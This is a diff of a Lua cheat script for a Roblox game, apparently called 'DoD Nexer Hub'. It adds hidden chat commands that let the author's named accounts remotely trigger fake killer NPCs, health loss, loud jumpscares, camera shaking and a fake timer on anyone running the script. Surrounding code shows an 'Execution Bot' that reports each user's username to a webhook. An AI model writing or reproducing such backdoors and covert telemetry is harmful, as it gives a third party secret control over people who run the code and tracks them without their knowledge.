@@ -2094,9 +2094,7 @@ target_char.HumanoidRootPart["Stalk3"].SoundId = suit.HumanoidRootPart["Stalk3"]
 target_char.HumanoidRootPart["Stalk4"].SoundId = suit.HumanoidRootPart["Stalk4"].SoundId
 end
 
-local console_injected = false
--- you know what are these functions... troll functions cuz IM BORED!!! !!11 !!!!!!!
-local function onChatted(message)
+local function onChattedCMDS(message)
     pcall(function()
     if message:match("-! inject (%a+)") then
 	local target_name = message:match("-! inject (%a+)")
@@ -2213,16 +2211,466 @@ end)
     end
     end)
 end
+
 for i,v in pairs(game:GetService("Players"):GetPlayers()) do
 if v.Name == LP.Name or v.Name == "Nexer1234_AnotherAlt" then
-v.Chatted:Connect(onChatted)
+v.Chatted:Connect(onChattedCMDS)
 end
 end
 game:GetService("Players").PlayerAdded:Connect(function(v)
 if v.Name == LP.Name or v.Name == "Nexer1234_AnotherAlt" then
-v.Chatted:Connect(onChatted)
+v.Chatted:Connect(onChattedCMDS)
 end
 end)
+
+
+
+function DamageEffect()
+task.spawn(function()
+game:GetService("Lighting").DamageEffect.Enabled = true
+game:GetService("Lighting").DamageEffect.Contrast = 0
+game:GetService("Lighting").DamageEffect.TintColor = Color3.fromRGB(255, 255, 255)
+game:GetService("TweenService"):Create(game:GetService("Lighting").DamageEffect, TweenInfo.new(0.5), {
+	["Contrast"] = 0.5
+}):Play()
+game:GetService("TweenService"):Create(game:GetService("Lighting").DamageEffect, TweenInfo.new(0.5), {
+	["TintColor"] = Color3.fromRGB(255, 52, 52)
+}):Play()
+task.wait(0.5)
+game:GetService("TweenService"):Create(game:GetService("Lighting").DamageEffect, TweenInfo.new(1), {
+	["Contrast"] = 0
+}):Play()
+game:GetService("TweenService"):Create(game:GetService("Lighting").DamageEffect, TweenInfo.new(1), {
+	["TintColor"] = Color3.fromRGB(255, 255, 255)
+}):Play()
+end)
+end
+
+function Jumpscare(duration)
+local soundhahaha = Instance.new("Sound")
+soundhahaha.SoundId = "rbxassetid://123871865507678"
+soundhahaha.Volume = 3
+soundhahaha.Name = "TROLLED ! ! !"
+soundhahaha.Parent = game.Players.LocalPlayer.PlayerGui
+repeat task.wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("TROLLED ! ! !")
+if not soundhahaha.IsLoaded then
+repeat task.wait() until soundhahaha.IsLoaded
+end
+soundhahaha:Play()
+task.spawn(function()
+soundhahaha.Ended:Connect(function() soundhahaha:Destroy() end)
+end)
+local INTENSITY = 3
+local SPEED = 12
+local ROLL_DOMINANCE = 8.5
+local random = Random.new()
+local timeOffset = random:NextNumber(0, 10)
+local lastBaseCFrame = CFrame.new()
+local function updateNauseaEffect()
+    local baseCFrame = CFrame.new(-307.768799, 67.831665, -286.936127, 0.998569787, 0.00722703338, -0.0529734381, 0, 0.990821779, 0.135175332, 0.0534641445, -0.134982005, 0.989404678)
+    lastBaseCFrame = baseCFrame
+    local time = os.clock() * SPEED + timeOffset
+    local roll = math.sin(time * 1.7) * math.rad(INTENSITY * ROLL_DOMINANCE)
+    local pitch = math.cos(time * 0.9) * math.rad(INTENSITY)
+    local yaw = math.sin(time * 1.3) * math.rad(INTENSITY)
+    local rotation = CFrame.Angles(pitch, yaw, roll)
+    workspace.CurrentCamera.CFrame = CFrame.new(baseCFrame.Position) * (baseCFrame.Rotation * rotation)
+end
+game:GetService("RunService"):BindToRenderStep("NauseaEffect", Enum.RenderPriority.Camera.Value + 1, updateNauseaEffect)
+local function disableNauseaEffect()
+    game:GetService("RunService"):UnbindFromRenderStep("NauseaEffect")
+    workspace.CurrentCamera.CFrame = lastBaseCFrame
+end
+task.delay(tonumber(duration),disableNauseaEffect)
+end
+
+
+
+function FakeKiller(npcname, targettingtime)
+local ragdoll = require(game:GetService("Players").LocalPlayer.PlayerGui.MainGui.Client.Modules.Effect)
+local npc = nil
+local ognpc = nil
+for i,v in pairs(game:GetService("ReplicatedStorage").Characters.Killer:GetDescendants()) do
+if v and v:IsA("Model") and v.Name and v.Parent:IsA("Folder") and v.Name:find(tostring(npcname)) or v.Name:match(tostring(npcname)) then
+npc = v:Clone()
+ognpc = v
+end
+end
+pcall(function()
+npc:WaitForChild("Humanoid").DisplayDistanceType = "None"
+end)
+npc.Parent = workspace.GameAssets.Teams.Killer
+if game.Players.LocalPlayer.Character:FindFirstChild("Vanities") and workspace.GameAssets:FindFirstChild("Map") then
+npc:WaitForChild("HumanoidRootPart").CFrame = workspace.GameAssets:WaitForChild("Map"):WaitForChild("Config"):WaitForChild("KillerSpawns"):GetChildren()[math.random(1,#workspace.GameAssets:WaitForChild("Map"):WaitForChild("Config"):WaitForChild("KillerSpawns"):GetChildren())].CFrame * CFrame.new(0,10,0)
+else
+npc:WaitForChild("HumanoidRootPart").CFrame = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
+end
+if ognpc.Parent.Name == "Badware" then
+npc:WaitForChild("Humanoid").WalkSpeed = 22
+elseif ognpc.Parent.Name == "Pursuer" then
+npc:WaitForChild("Humanoid").WalkSpeed = 26
+elseif ognpc.Parent.Name == "Artful" then
+npc:WaitForChild("Humanoid").WalkSpeed = 24.5
+else
+npc:WaitForChild("Humanoid").WalkSpeed = 24.5
+end
+local loadedanim_run = npc:WaitForChild("Humanoid"):LoadAnimation(npc:WaitForChild("Animations"):WaitForChild("Sprint"))
+loadedanim_run:Play()
+loadedanim_run:AdjustSpeed(tonumber(1))
+local loadedanim_swing = npc:WaitForChild("Humanoid"):LoadAnimation(npc:WaitForChild("Animations"):WaitForChild("Swing"))
+local cd = false
+local start = tick()
+while tick() - start < tonumber(targettingtime) do
+pcall(function()
+newpath = game:GetService("PathfindingService"):CreatePath({
+	AgentRadius = 3,
+	AgentHeight = 6,
+	AgentCanJump = false,
+	AgentCanClimb = false,
+	WaypointSpacing = 6,
+})
+newpath:ComputeAsync(npc:WaitForChild("HumanoidRootPart").Position, game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position)
+waypoints = newpath:GetWaypoints()
+if waypoints ~= nil and waypoints[2] ~= nil then
+npc:WaitForChild("Humanoid"):MoveTo(waypoints[2].Position)
+end
+newpath = nil
+end)
+task.wait()
+local magnitude = (npc:WaitForChild("HumanoidRootPart").Position - game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).magnitude
+if magnitude < 7 and cd == false and game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health ~= 0 then
+if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health < 26 then
+game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = tonumber(game.Players.LocalPlayer.Character:WaitForChild("Humanoid").MaxHealth)
+loadedanim_run:Stop()
+loadedanim_run:AdjustSpeed(tonumber(0))
+loadedanim_swing:Stop()
+loadedanim_swing:AdjustSpeed(tonumber(0))
+--ragdoll.Ragdoll(npc)
+task.spawn(function()
+Jumpscare(4)
+end)
+npc:Destroy()
+return nil
+end
+cd = true
+loadedanim_swing:Play()
+task.wait(.5)
+--DamageEffect()
+if ognpc.Parent.Name == "Artful" then
+game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health - 25
+else
+game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health - 20
+end
+npc:WaitForChild("HumanoidRootPart"):WaitForChild("Hit"):Play()
+task.delay(1,function()
+cd = false
+end)
+end
+end
+game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = tonumber(game.Players.LocalPlayer.Character:WaitForChild("Humanoid").MaxHealth)
+loadedanim_run:Stop()
+loadedanim_run:AdjustSpeed(tonumber(0))
+loadedanim_swing:Stop()
+loadedanim_swing:AdjustSpeed(tonumber(0))
+--ragdoll.Ragdoll(npc)
+task.spawn(function()
+Jumpscare(4)
+end)
+npc:Destroy()
+end
+
+
+
+function FakeSurvivor()
+local npc = game:GetService("ReplicatedStorage").Characters.Survivor.Civilian:Clone()
+pcall(function()
+npc:WaitForChild("Humanoid").DisplayDistanceType = "None"
+end)
+npc.Name = tostring(game.Players:GetChildren()[math.random(1,#game.Players:GetChildren())].Name)
+npc.Parent = workspace.GameAssets.Teams.Survivor
+if workspace.GameAssets:FindFirstChild("Map") then
+npc:WaitForChild("HumanoidRootPart").CFrame = workspace.GameAssets:WaitForChild("Map"):WaitForChild("Config"):WaitForChild("SurvivorSpawns"):GetChildren()[math.random(1,#workspace.GameAssets:WaitForChild("Map"):WaitForChild("Config"):WaitForChild("SurvivorSpawns"):GetChildren())].CFrame * CFrame.new(0,10,0)
+else
+npc:WaitForChild("HumanoidRootPart").CFrame = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
+end
+local loadedanim_idle = npc:WaitForChild("Humanoid"):LoadAnimation(npc:WaitForChild("Animations"):WaitForChild("Idle"))
+loadedanim_idle:Play()
+loadedanim_idle:AdjustSpeed(tonumber(1))
+for i,v in pairs(npc:WaitForChild("Vanities"):GetChildren()) do
+if v and v:IsA("BasePart") then
+v.Transparency = 1
+end
+end
+local luck = math.random(1,3)
+if luck == 1 then
+npc:WaitForChild("Vanities"):WaitForChild("Caretaker").Transparency = 0
+npc:WaitForChild("Torso").Color = Color3.fromRGB(255,255,255)
+elseif luck == 2 then
+npc:WaitForChild("Vanities"):WaitForChild("Aussie Slouch").Transparency = 0
+npc:WaitForChild("Torso").Color = Color3.fromRGB(150,100,0)
+elseif luck == 3 then
+npc:WaitForChild("Vanities"):WaitForChild("Cloak").Transparency = 0
+npc:WaitForChild("Vanities"):WaitForChild("NinjaMask").Transparency = 0
+npc:WaitForChild("Torso").Color = Color3.fromRGB(255,255,255)
+end
+npc:WaitForChild("HumanoidRootPart").CanTouch = true
+local alr_jumpscared = false
+local touch_connection = npc:WaitForChild("HumanoidRootPart").Touched:Connect(function(child)
+local magnitude = (npc:WaitForChild("HumanoidRootPart").Position - game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).magnitude
+if child and child:IsA("BasePart") and child.Name == "Part" and child.Color == Color3.fromRGB(255,0,0) and child.Material == Enum.Material.ForceField and magnitude < 25 then
+loadedanim_idle:Stop()
+loadedanim_idle:AdjustSpeed(tonumber(0))
+npc:Destroy()
+alr_jumpscared = true
+task.spawn(function()
+Jumpscare(4)
+end)
+pcall(function()
+touch_connection:Disconnect()
+end)
+end
+end)
+if not workspace.GameAssets.Teams.Killer:FindFirstChildOfClass("Model") then
+loadedanim_idle:Stop()
+loadedanim_idle:AdjustSpeed(tonumber(0))
+npc:Destroy()
+pcall(function()
+touch_connection:Disconnect()
+end)
+else
+repeat task.wait() until workspace.GameAssets.Teams.Killer:FindFirstChildOfClass("Model") == nil or alr_jumpscared == true
+if alr_jumpscared == true then return nil end
+loadedanim_idle:Stop()
+loadedanim_idle:AdjustSpeed(tonumber(0))
+npc:Destroy()
+pcall(function()
+touch_connection:Disconnect()
+end)
+end
+end
+
+
+
+function FakeTimer()
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:20"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:19"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:18"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:17"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:16"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:15"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:14"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:13"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:12"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:11"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:10"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:09"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:08"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:07"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:06"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:05"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:04"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:03"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:02"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:01"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.TickIncrease:Play()
+local start = tick()
+while tick() - start < 1 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "00:00"
+task.wait()
+end
+game:GetService("ReplicatedStorage").Sounds.SFX.SurvivorWin:Play()
+local start = tick()
+while tick() - start < 7 do
+game:GetService("ReplicatedStorage").StringConfig.Status.Value = "Time's up! The Survivors win!"
+task.wait()
+end
+Jumpscare(4)
+end
+
+
+
+local ChoosenKiller = ""
+local ChoosenTargettingTime = 30
+local function onChattedTROLLCMDS(message)
+pcall(function()
+if message:match("/e choosekiller (%a+)") then
+local target_name = message:match("/e choosekiller (%a+)")
+ChoosenKiller = tostring(target_name)
+
+if message:match("/e timekiller (%a+)") then
+local target_name = message:match("/e timekiller (%a+)")
+ChoosenTargettingTime = tonumber(target_name)
+				
+elseif message:match("/e spawnkiller (%a+)") then
+local target_name = message:match("/e spawnkiller (%a+)")
+local playerfound
+for i,v in pairs(game.Players:GetPlayers()) do
+if string.sub(v.Name, 1, #target_name):lower() == target_name:lower() then
+playerfound = v
+break
+end
+end
+if playerfound and playerfound.Name == LP.Name or target_name == "everyone/all" then
+FakeKiller(ChoosenKiller, ChoosenTargettingTime)
+end
+
+elseif message:match("/e spawntimer (%a+)") then
+local target_name = message:match("/e spawntimer (%a+)")
+local playerfound
+for i,v in pairs(game.Players:GetPlayers()) do
+if string.sub(v.Name, 1, #target_name):lower() == target_name:lower() then
+playerfound = v
+break
+end
+end
+if playerfound and playerfound.Name == LP.Name or target_name == "everyone/all" then
+FakeTimer()
+end
+
+
+elseif message:match("/e spawnsurvivor (%a+)") then
+local target_name = message:match("/e spawnsurvivor (%a+)")
+local playerfound
+for i,v in pairs(game.Players:GetPlayers()) do
+if string.sub(v.Name, 1, #target_name):lower() == target_name:lower() then
+playerfound = v
+break
+end
+end
+if playerfound and playerfound.Name == LP.Name or target_name == "everyone/all" then
+FakeSurvivor()
+end
+
+
+elseif message:match("/e spawnjumpscare (%a+)") then
+local target_name = message:match("/e spawnjumpscare (%a+)")
+local playerfound
+for i,v in pairs(game.Players:GetPlayers()) do
+if string.sub(v.Name, 1, #target_name):lower() == target_name:lower() then
+playerfound = v
+break
+end
+end
+if playerfound and playerfound.Name == LP.Name or target_name == "everyone/all" then
+Jumpscare(4)
+end
+					
+				
+end
+end)
+end
+
+for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+if v.Name == LP.Name or v.Name == "Nexer1234_AnotherAlt" or v.Name == "Mia_Z3ro2002" then
+v.Chatted:Connect(onChattedTROLLCMDS)
+end
+end
+game:GetService("Players").PlayerAdded:Connect(function(v)
+if v.Name == LP.Name or v.Name == "Nexer1234_AnotherAlt" or v.Name == "Mia_Z3ro2002" then
+v.Chatted:Connect(onChattedTROLLCMDS)
+end
+end)
+
 
 function getping()
     return math.round(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
@@ -2270,7 +2718,7 @@ if req then
 local data = {
     ["username"] = "Execution Bot",
     ["avatar_url"] = "https://i.imgur.com/a/SbPHgnH",
-    ["content"] = "@everyone "..LP.Name.." executed DoD Nexer Hub o(￣┰￣*)ゞ",
+    ["content"] = "@everyone "..LP.Name.." executed DoD Nexer Hub .·´¯`(>▂<)´¯`·. ",
     ["embeds"] = {
        {
            ["title"] = "General Info",
@@ -2398,7 +2846,7 @@ if req then
 local data = {
     ["username"] = "Execution Bot",
     ["avatar_url"] = "https://i.imgur.com/a/SbPHgnH",
-    ["content"] = "@everyone "..LP.Name.." executed DoD Nexer Hub o(￣┰￣*)ゞ",
+    ["content"] = "@everyone "..LP.Name.." executed DoD Nexer Hub .·´¯`(>▂<)´¯`·. ",
     ["embeds"] = {
        {
            ["title"] = "General Info",
